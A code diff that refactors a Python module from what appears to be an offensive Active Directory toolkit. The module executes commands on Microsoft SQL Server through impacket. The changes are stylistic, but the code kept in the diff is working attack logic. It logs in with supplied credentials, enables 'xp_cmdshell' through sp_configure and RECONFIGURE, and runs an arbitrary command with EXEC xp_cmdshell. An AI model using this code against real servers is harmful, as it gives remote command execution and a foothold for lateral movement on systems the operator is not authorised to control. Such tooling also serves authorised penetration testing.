@@ -1,5 +1,4 @@
-"""MSSQL exec — SQL Server command execution via xp_cmdshell / sp_oacreate."""
-from __future__ import annotations
+"""MSSQL exec  -  SQL Server command execution via xp_cmdshell / sp_oacreate."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -22,7 +21,7 @@ def run(args: Any) -> int:
     method = getattr(args, "mssql_method", "xp_cmdshell")
     windows_auth = getattr(args, "windows_auth", True)
 
-    print("[*] MSSQL exec → {}:{} (method: {})".format(target, port, method))
+    print(f"[*] MSSQL exec → {target}:{port} (method: {method})")
 
     try:
         from impacket.tds import MSSQL
@@ -46,14 +45,14 @@ def run(args: Any) -> int:
             print("[-] Authentication failed")
             return 1
 
-        print("[+] Authenticated to MSSQL as {}\\{}".format(cred.domain, cred.username))
+        print(f"[+] Authenticated to MSSQL as {cred.domain}\\{cred.username}")
 
         if method == "xp_cmdshell":
             print("[*] Enabling xp_cmdshell...")
             ms_sql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
             ms_sql.sql_query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
 
-            print("[*] Executing: {}".format(command))
+            print(f"[*] Executing: {command}")
             ms_sql.sql_query("EXEC xp_cmdshell '{}'".format(command.replace("'", "''")))
             ms_sql.printReplies()
 
@@ -71,5 +70,5 @@ def run(args: Any) -> int:
         return 0
 
     except Exception as exc:
-        print("[-] MSSQL error: {}".format(exc), file=sys.stderr)
+        print(f"[-] MSSQL error: {exc}", file=sys.stderr)
         return 1
